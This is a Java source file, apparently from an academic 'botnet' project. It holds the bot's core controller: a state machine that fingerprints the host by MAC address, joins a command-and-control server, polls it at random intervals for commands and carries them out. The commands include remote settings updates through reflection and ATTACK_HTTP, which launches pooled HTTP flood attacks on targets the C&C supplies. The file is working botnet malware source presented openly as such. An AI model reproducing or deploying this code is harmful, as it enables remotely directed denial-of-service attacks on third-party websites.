/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core;

import com.acmutv.botnet.config.AppConfiguration;
import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.BotCommandService;
import com.acmutv.botnet.core.exception.*;
import com.acmutv.botnet.core.pool.BotPool;
import com.acmutv.botnet.core.state.BotState;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.reflection.ReflectionManager;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.time.Duration;
import com.acmutv.botnet.tool.time.Interval;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.beans.IntrospectionException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the core business logic.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class CoreController {

  private static final Logger LOGGER = LogManager.getLogger(CoreController.class);

  /**
   * The bot ID.
   */
  public static String ID;

  /**
   * The bot state.
   */
  public static BotState STATE;

  /**
   * The bot thread pool.
   */
  private static BotPool POOL;


  /**
   * The bot entry-point.
   * @throws BotFatalException when bot's life cycle is interrupted.
   */
  public static void startBot() throws BotFatalException {
    changeState(BotState.INIT);
    boolean alive = true;
    while (alive) {
      switch (STATE) {
        case INIT:
          try {
            initializeBot();
          } catch (BotInitializationException exc) {
            throw new BotFatalException("Cannot initialize bot. %s", exc.getMessage());
          }
          break;

        case JOIN:
          try {
            joinBotnet();
          } catch (BotInitializationException exc) {
            throw new BotFatalException("Cannot join botnet. %s", exc.getMessage());
          }
          break;

        case EXECUTION:
          try {
            BotCommand cmd = getNextCommand();
            if (cmd.equals(BotCommand.NONE)) {
              break;
            }
            executeCommand(cmd);
          } catch (BotCommandParsingException exc) {
            LOGGER.warn("Cannot read command. {}", exc.getMessage());
          } catch (BotMalformedCommandException exc) {
            LOGGER.warn("Not valid command read. {}", exc.getMessage());
          } catch (BotExecutionException exc) {
            LOGGER.warn("Cannot execute command. {}", exc.getMessage());
          }
          break;

        case DEAD:
          alive = false;
          break;

        default:
          break;
      }

      pollingPause();
    }
  }

  private static void pollingPause() {
    final Interval pollingPeriod = AppConfigurationService.getConfigurations().getPolling();
    final long pollingPauseAmount =
        ThreadLocalRandom.current().nextLong(pollingPeriod.getMin(), pollingPeriod.getMax());
    try {
      pollingPeriod.getUnit().sleep(pollingPauseAmount);
    } catch (InterruptedException exc) {
      return;
    }
  }

  /**
   * Executes the state `INIT`.
   * Initializes the bot, giving it an identity.
   * @throws  BotInitializationException when errors during initialization.
   */
  public static void initializeBot() throws BotInitializationException {
    LOGGER.traceEntry("Initializing bot...");
    try {
      generateId();
    } catch (SocketException | UnknownHostException exc) {
      throw new BotInitializationException("Cannot generated bot ID. %s", exc.getMessage());
    }
    LOGGER.info("Bot initialized with ID={}", ID);
    changeState(BotState.JOIN);
  }

  /**
   * Executes the state `JOIN`.
   * Establishes a connection with the CC and make the bot join the botnet.
   * @throws  BotInitializationException when errors during botnet joining.
   */
  public static void joinBotnet() throws BotInitializationException {
    LOGGER.traceEntry("Joining botnet...");
    final String initResource = AppConfigurationService.getConfigurations().getInitResource();
    LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
    try {
      AppConfigurationService.loadJsonResource(initResource);
    } catch (IOException exc) {
      throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
    }
    LOGGER.trace("Botnet joined");
    allocateResources();
    changeState(BotState.EXECUTION);
    LOGGER.info("Bot is up and running");
  }

  /**
   * Executes a command.
   * @param cmd the command to execute.
   * @throws BotMalformedCommandException when command parameters are malformed.
   * @throws BotExecutionException when command cannot be correctly executed.
   */
  public static void executeCommand(final BotCommand cmd)
      throws BotMalformedCommandException, BotExecutionException {
    LOGGER.traceEntry("cmd={}", cmd);
    LOGGER.info("Received command {} with params={}", cmd.getScope(), cmd.getParams());

    switch (cmd.getScope()) {

      case RESTART:
        final String resource = (String) cmd.getParams().get("resource");
        if (resource == null || resource.isEmpty()) {
          throw new BotMalformedCommandException("Cannot execute command RESTART: param [resource] is null/empty");
        }
        restartBot(resource);
        break;

      case UPDATE:
        @SuppressWarnings("unchecked")
        final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
        if (settings == null) {
          throw new BotMalformedCommandException("Cannot execute command UPDATE: param [settings] is null");
        }
        updateBot(settings);
        break;

      case SLEEP:
        final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
        if (sleepTimeout == null) {
          throw new BotMalformedCommandException("Cannot execute command SLEEP: param [timeout] is null");
        }
        sleep(sleepTimeout);
        break;

      case SHUTDOWN:
        final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
        if (shutdownTimeout == null) {
          throw new BotMalformedCommandException("Cannot execute command SHUTDOWN: param [timeout] is null");
        }
        shutdown(shutdownTimeout);
        break;

      case KILL:
        kill();
        break;

      case ATTACK_HTTP:
        final HttpMethod method = (HttpMethod) cmd.getParams().get("method");
        @SuppressWarnings("unchecked")
        final List<HttpTarget> targets = (List<HttpTarget>) cmd.getParams().get("targets");
        if (method == null) {
          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [method] is null");
        }
        if (targets == null) {
          throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets] is null");
        } else {
          for (HttpTarget target : targets) {
            if (target.getUrl() == null) {
              throw new BotMalformedCommandException("Cannot execute command ATTACK_HTTP: param [targets.target.url] is null");
            }
          }
        }
        executeHttpAttack(method, targets);
        break;

      default:
        break;
    }
    LOGGER.traceExit();
  }

  /**
   * Generates the bot ID [MAC_ADDRESS]-[JVM-NAME].
   * @throws SocketException when MAC cannot be read.
   * @throws UnknownHostException when MAC cannot be read.
   */
  private static void generateId() throws SocketException, UnknownHostException {
    LOGGER.traceEntry("Generating ID...");
    final String mac = ConnectionManager.getMAC();
    final String jvmName = RuntimeManager.getJvmName();
    ID = String.format("%s-%s", mac, jvmName);
    LOGGER.trace("ID generated: {}", ID);
  }

  /**
   * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
   * @return the parsed command; command with scope NONE, in case of error.
   * @throws BotCommandParsingException when command resource is unreachable.
   */
  private static BotCommand getNextCommand() throws BotCommandParsingException {
    final String cmdResource = AppConfigurationService.getConfigurations().getCmdResource();
    LOGGER.trace("Consuming command from C&C at {}...", cmdResource);
    BotCommand cmd;
    try {
      cmd = BotCommandService.consumeJsonResource(cmdResource);
    } catch (IOException exc) {
      throw new BotCommandParsingException("Cannot consume command. %s", exc.getMessage());
    }
    return LOGGER.traceExit(cmd);
  }

  /**
   * Executes the bot command `RESTART`.
   * @param resource the path to the CC initialization resource.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void restartBot(String resource) throws BotExecutionException {
    LOGGER.traceEntry("resource={}", resource);
    LOGGER.info("Restarting bot with resource {}...", resource);
    try {
      AppConfigurationService.loadJsonResource(resource);
    } catch (IOException exc) {
      throw new BotExecutionException("Cannot restart bot. Initialization resource cannot be read. %s", exc.getMessage());
    }
    LOGGER.traceExit();
  }

  /**
   * Executes the command `UPDATE`.
   * @param settings the settings to load.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void updateBot(Map<String,String> settings) throws BotExecutionException {
    LOGGER.traceEntry("settings={}", settings);
    LOGGER.info("Updating bot settings ...");
    for (Map.Entry<String,String> property : settings.entrySet()) {
      final String k = property.getKey();
      final String v = property.getValue();
      try {
        ReflectionManager.set(AppConfiguration.class,
            AppConfigurationService.getConfigurations(), k, v);
      } catch (IntrospectionException | InvocationTargetException | IllegalAccessException exc) {
        throw new BotExecutionException("Cannot update bot. Invalid settings found (%s to value %s).", k, v);
      }
    }
    LOGGER.info("Bot settings updated");
    LOGGER.traceExit();
  }

  /**
   * Executes the command `SLEEP`.
   * @param timeout the time period to sleep.
   * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
   */
  private static void sleep(Duration timeout) throws BotExecutionException {
    LOGGER.traceEntry("timeout={}", timeout);
    LOGGER.info("Sleeping (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
    changeState(BotState.SLEEP);
    POOL.pause(timeout);
    try {
      timeout.getUnit().sleep(timeout.getAmount());
    } catch (InterruptedException exc) {
      throw new BotExecutionException("Cannot complete sleeping. %s", exc.getMessage());
    }
    LOGGER.info("Awake");
    changeState(BotState.EXECUTION);
    LOGGER.traceExit();
  }


  /**
   * Executes the command `SHUTDOWN`.
   * All resources are released, softly.
   * @param timeout the time to shutdown.
   */
  private static void shutdown(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    LOGGER.info("Shutting down the bot (timeout: {} {})...", timeout.getAmount(), timeout.getUnit());
    freeResources(timeout);
    LOGGER.info("Bot shut down");
    changeState(BotState.DEAD);
    LOGGER.traceExit();
  }

  /**
   * Executes the command `KILL`.
   * All resources are released, immediately.
   */
  private static void kill() {
    LOGGER.info("Killing the bot...");
    freeResources(null);
    LOGGER.info("Bot killed");
    changeState(BotState.DEAD);
  }

  public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets) {
    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
    LOGGER.info("Scheduling attack...");
    targets.stream().forEach(target -> {
      HttpAttack attacker = new HttpAttack(method, target);
      POOL.submit(attacker);
    });
    LOGGER.info("Attack scheduled");
    LOGGER.traceExit();
  }

  /**
   * Allocates bot's resources.
   */
  private static void allocateResources() {
    LOGGER.trace("Allocating resources...");
    POOL = new BotPool();
    //TODO
    LOGGER.trace("Resources allocated");
  }

  /**
   * Deallocates bot's resources.
   * If timeout is specified, resources are deallocated softly.
   * If timeout is not specified, resources are deallocated immediately.
   * @param timeout the timeout for resources deallocation (null for immediate deallocation).
   */
  private static void freeResources(Duration timeout) {
    LOGGER.traceEntry("timeout={}", timeout);
    if (timeout == null) {
      POOL.kill();
    } else {
      POOL.shutdown(timeout);
    }
    LOGGER.traceExit();
  }

  /**
   * Changes the bot state.
   * @param state the new state.
   */
  private static void changeState(BotState state) {
    LOGGER.traceEntry("state={}", state.getName());
    STATE = state;
  }

}
